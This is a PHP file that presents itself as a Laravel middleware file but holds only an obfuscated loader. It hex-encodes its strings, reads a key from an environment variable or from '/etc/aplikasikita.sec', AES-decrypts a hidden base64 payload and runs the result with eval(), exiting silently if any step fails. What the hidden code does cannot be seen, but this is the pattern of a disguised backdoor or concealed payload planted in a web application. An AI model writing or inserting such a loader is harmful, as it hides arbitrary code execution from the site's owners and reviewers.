<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('0sZED9rUuIfzj81aRylRdA==');

$c=base64_decode(

'9fyfpu0Fx3WC7bZ964P+LQJ5vYx4iOYfEgbV312PoJcD+SBQOqTThmAVhy63GayGFaY8gq+8IGbW' .
'aUaLHkvpasva05rswH8swgCjO4Z+mUXUQ23Ra0c+UzLThekH7vjL0Jpm5NtCG777lRtIj72Cxy1c' .
'm71GeaT45z63vlKr70Sj6Q4fKvDBlF+X5wOEPNleAWq60tq5YiJE8iMqHTcLhIKkKjGfD/sQRjtP' .
'VINtZ96z6vExLLLnHiHF3XqyAHxJqx9H2NEG4xtIVxsmRIp5RIoTasWeE4LXz554btKWFZ/tOLps' .
'Wt649i0pOgB8Avib3TRKESxuTjOtRJRiCrl35RvPQMZKbLsU3U9eIZUiD1Ujz//+AXekb2KnjiPp' .
'jpW7COw+n8ryhP6ePXdqKBDoBqnZDWxHliZiwblBO7UxZGV2qOdzsShUC9dfWzi6x874JHBXEFUh' .
'/urYqTddvRuJxxDgJBmqkL9mVSR4bUlbXTR3PffG/+8QrzGNnYVDBkBoG3CD8ey6ev3z5WUAcWWz' .
'fsD9EH1MKUIKMNjzbh91l/InDLObercqEaXSAUeQZP2ElD0y20EdaGF7A2HHUxfX9R2HORDyNy25' .
'OYYMKyhuO11kFcHStRcl4sW9oeBboe5lMOP03/7fUeFIAsgWyynToorJJ32ZO3TuVpXKvGW1KAWG' .
'g60erFm2BBj8y1xZ/n7GiWau39/QAlgzsntoiLPIgxjTjsbWNbf+xIRwp2Sco2htde1byZ5da/Pp' .
'NpLm09JYZ4RWMlbeHFzH206bw0dLHDPc64IoYdi6o07gi7HxzFYwr94JfB9sadi0iw1C43KtoD+b' .
'aFgGyEsFZzkzAaVG+bl4jWPzufEVJh7QBbdXj7WEpbuk/xcaMzVvGwlPlb7lgC9g4bgUSgTW6HhU' .
'emZgI6w/DSyfO6nzm88/bJgNc6WB/LUAgVZqH+Hg/YptVNvnTEzSN+HMxQvBNzoBixY/XqVreYLn' .
'vSi/kbTqWgdrwBrf/XxlQwLZbVZQSO/6CMWqrFEfIB0bUPWQ6sHTmf5u6U4v17txg6tuU82m4HDU' .
'CblHhrp85gg7a6W//4T8K5zqVD7yd7wczyqVMMYjM1R2aynVD9mVAiuE1rCus1T5C1iNGOgJVLKZ' .
'Pjy0GUtROYtGy10lyWtNs3iAjuFXSlIe4FoageoazkKP5ux4bGSy+2FwZ87BfVhVfAyHg/nfuWf2' .
'CJRcVdrjCWuIlminFZxqeD4+VfivS7xgT6CG7ocMzDLEqhGnkuWHUKE3SLoy6gCznqQBg3qfzoXG' .
'UU7N7vQa4/eJAz68RqtX7wIxqw1OD6rvj0VxZTH41WpvsvXzD/1ejkMplIUOrcHzwmp4wKX7idu9' .
'ohW7NLdAgMYKl/our9Lyck7YE6kab5BktjN/g/TR1Vs3jQkUetJx2oBsCWyAic7oQArYhLPH/BpB' .
'e2SzuT+pMgpCryXYmNwpfM3t9buxwPRRXMDVqS/3j9cqTzswSyQEbHfvEAClwuBFEqDFRSa60TOr' .
'YFvtV/rP6womvR6pgpkAwe38pa5mv91HW0VL8g=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

